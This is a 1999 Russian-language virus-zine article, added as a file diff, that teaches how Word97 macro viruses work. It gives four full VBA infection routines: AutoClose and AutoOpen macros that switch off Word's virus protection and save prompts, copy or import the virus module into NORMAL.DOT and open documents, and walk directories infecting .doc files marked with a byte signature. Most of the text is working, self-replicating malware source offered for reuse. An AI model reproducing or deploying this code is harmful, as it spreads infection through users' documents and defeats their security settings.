@@ -1,0 +1,230 @@
+INFECTED VOICE ONLINE. (C)1994-99, by STEALTH group. EMail: noxyucT@usa.net
+WORD'97 MACRO VIRII (C)1999, by ULTRAS.
+----------------------------------------------------------------------------
+Любое коммерческое использование текста без согласия LovinGOD и/или автора 
+статьи запрещено. При некоммерческом использовании ссылка на STEALTH group и
+сайт http://redline.ru/~one обязательна.
+----------------------------------------------------------------------------
+
+Макро вирусы под Word97
+~~~~~~~~~~~~~~~~~~~~~~~
+
+Принципы работы
+~~~~~~~~~~~~~~~
+При работе с документом Word выполняет различные действия: открывает документ, сохраняет, 
+печатает, закрывает и т.д. При этом Word ищет и выполняет соответствующие "встроенные макросы" 
+- при сохранении файла по команде File/Save вызывается макрос FileSave, при сохранении по
+команде File/SaveAs - FileSaveAs, при печати документов - FilePrint и т.д.,
+если, конечно, таковые макросы определены.
+
+Существует также несколько "авто-макросов", автоматически вызываемые при различных условиях. 
+Например, при открытии документа Word проверяет его на наличие макроса AutoOpen. Если такой 
+макрос присутствует, то Word выполняет его. При закрытии документа Word выполняет макрос 
+AutoClose, при запуске Word вызывается макрос AutoExec, при завершении работы - AutoExit, 
+при создании нового документа - AutoNew.  Макро вирусы получают управление при открытии или 
+закрытии зараженного файла, перехватывают стандартные файловые функции и затем заражают файлы, 
+к которым каким-либо образом идет обращение. По аналогии с MS-DOS можно сказать, что большинство 
+макро-вирусов являются резидентными: они активны не только в момент открытия/закрытия файла, 
+но до тех пор, пока активен сам редактор.
+
+
+Алгоритм работы Word97 макро-вирусов
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Большинство известных Word-вирусов (версий Word97 и 2000) при запуске
+копируют свой код (модуль вируса) в область глобальных макросов документа (NORMAL.DOT),
+таким образом, при следующем запуске редактора MS-Word вирус активизируется в тот момент, 
+когда Word97 грузит глобальные модули, т.е. сразу.
+Затем вирус переопределяет содержащие в нем макросы (например, AutoOpen, AutoExit, FilePrint) 
+и перехватывает их таким образом, что при вызове этих макросов будет заражаться документ.
+Ниже описаны четыри метода заражения макро вирусов.
+
+Метод 1:
+--------
+Стандартное зараженние. При закрытий документа проверяет в активном документе и normal.dot 
+модуль вируса, если не найден то заражает его.
+
+Sub AutoClose()
+'заражает при закрытия документов
+On Error Resume Next
+Options.VirusProtection = False
+'Выключает защиту от вирусов и запуск авто-функций.
+Set ActiveDoc = ActiveDocument
+Set GlobalDoc = NormalTemplate
+DocInfect = False
+'документ не заражен
+GlobInfect = False
+'normal.dot не заражен
+For b = 1 To ActiveDocument.VBProject.VBComponents.Count
+If ActiveDocument.VBProject.VBComponents(b).Name = "Nop" Then
+'если в активном документе есть модуль нашего вируса
+DocInfect = True
+'то документ уже заражен
+End If
+Next
+For u = 1 To NormalTemplate.VBProject.VBComponents.Count
+If NormalTemplate.VBProject.VBComponents(u).Name = "Nop" Then
+'если normal.dot есть модуль нашего вируса
+GlobInfect = True
+'то normal.dot заражен
+End If
+Next
+If DocInfect = False Then
+'если в активном документе нет модуля нашего вируса то заражаем его
+Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Nop", Object:=wdOrganizerObjectProjectItems
+'копируем модуль вируса
+ActiveDocument.SaveAs filename:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
+End If
+If GlobInfect = False Then
+'если в normal.dot нет модуля нашего вируса то заражаем его
+Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Nop", Object:=wdOrganizerObjectProjectItems
+'копируем модуль вируса
+Options.SaveNormalPrompt = False
+End If
+Application.DisplayAlerts = wdAlertsAll
+End Sub
+
+
+Метод 2:
+--------
+
+Для заражения документов вирусом используются функции VisualBasic Import и Export вирус 
+записывает (экспортирует) свой Бейсик-текст в файл C:\MMM.SYS и затем считывает (импортирует) его 
+в текущий документ (в случае Word) В случае Word для заражения документов вирус перехватывает 
+авто-макросы AutoClose.
+
+Sub AutoClose()
+'заражает при закрытия документов
+On Error Resume Next
+Options.VirusProtection = False
+'Выключает защиту от вирусов и запуск авто-функций.
+Options.SaveNormalPrompt = False
+'выключем сообщение об изменений normal.dot
+Application.VBE.ActiveVBProject.VBComponents("SG").Export "C:\MMM.SYS"
+'экспортируем модуль вируса на диск
+For I = 1 To NormalTemplate.VBProject.VBComponents.Count
+If NormalTemplate.VBProject.VBComponents(I).Name = "SG" Then NormInstall = True
+'если в normal.dot нет модуля нашего вируса то заражаем его
+Next I
+For I = 1 To ActiveDocument.VBProject.VBComponents.Count
+If ActiveDocument.VBProject.VBComponents(I).Name = "SG" Then ActivInstall = True
+Next I
+'если в активном документе нет модуля нашего вируса то заражаем его
+If ActivInstall = True And NormInstall = False Then Set SexR = NormalTemplate.VBProject _
+Else If ActivInstall = False And NormInstall = True Then Set SexR = ActiveDocument.VBProject
+With SexR
+With .VBComponents.Import("c:\MMM.SYS")
+End With
+End With
+'импортируем модуль вируса в незараженные обЪекты
+If ActivInstall = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.Full
+Name, FileFormat:=wdFormatDocument
+End Sub
+
+Метод 3:
+--------
+"Нерезидентен" - при открытии зараженного файла ищет документы в каталогах от текущего каталога 
+до корневого и заражает их. Свое присутствие в файле определяет по последовательности байт, 
+которую при заражении записывает в неиспользуемую область заголовка документа.
+
+
+Sub AutoOpen()
+'заражает при открытий документов
+On Error Resume Next
+Application.DisplayAlerts = wdAlertsNone
+Options.VirusProtection = False
+'Выключает защиту от вирусов и запуск авто-функций.
+rsminf: FileName$ = CurDir$ + "\" + Dir("*.doc")
+'ищем doc файлы в текущем каталоге
+Open FileName$ For Input As #1
+'открываем файл
+Seek #1, 521
+'ищем в нем строку
+RSM$ = Input$(3, #1)
+Close #1
+If RSM$ = Chr$(1) + Chr$(18) + Chr$(191) Then GoTo chgdir
+'если нашли свои опозновательные знаки, то меняем директорию
+Open FileName$ For Append As #1
+'нашли не зараженный документ откроем его
+Seek #1, 523
+'ищем строку
+Print #1, Chr$(1) + Chr$(18) + Chr$(191) + Chr$(0) + Chr$(0)
+'вписываем в найденный док метку вируса
+Close #1
+'закрываем документ
+rsmdoc = ActiveDocument.FullName
+Application.Documents.Open FileName
+'открываем документ
+Application.OrganizerCopy Source:=rsmdoc, Destination:=FileName, Name:="RatSMagic", Object:=wdOrganizerObjectProjectItems
+'копируем модуль вируса в документ
+Application.Documents.Save
+'сохраним зараженный документ
+ActiveDocument.Close
+'закрываем
+chgdir: ChDir ".."
+'изменяем директорию
+GoTo rsminf
+'поиск файлов
+ecsit:
+end sub
+
+Метод 4:
+--------
+
+Заражает систему при открытии зараженного файла, при этом экспортирует свое код в файл 
+C:\CLASS.SYS и вставляет его в NORMAL.DOT макрос. Заражение документов осуществляется тем же 
+образом при их закрытии. 
+
+Sub AutoOpen()
+заражает при открытий документов
+On Error GoTo out
+Options.ConfirmConversions = False
+Options.VirusProtection = False
+'Выключает защиту от вирусов и запуск авто-функций.
+Options.SaveNormalPrompt = False
+ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
+nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
+If nt = 0 Then 
+Set host = NormalTemplate.VBProject.VBComponents.Item(1)
+ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
+'экспортируем модуль вируса на диск
+End If
+If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
+If nt > 0 And ad > 0 Then GoTo out
+'Проверяем если комманды в активном документе и normal.dot
+host.codemodule.AddFromFile ("c:\class.sys")
+'экспортируем class модуль
+With host.codemodule
+ 
+For x = 1 To 4
+ 
+.deletelines 1
+ 
+Next x
+ 
+End With
+ 
+If nt = 0 Then
+ 
+With host.codemodule
+ 
+.replaceline 1, "Sub AutoClose()"
+ 
+.replaceline 69, "Sub ViewVBCode()"
+    
+End With
+ 
+End If
+ 
+out:
+ 
+If nt <> 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
+ 
+End Sub
+
+
+
+
+
+
+
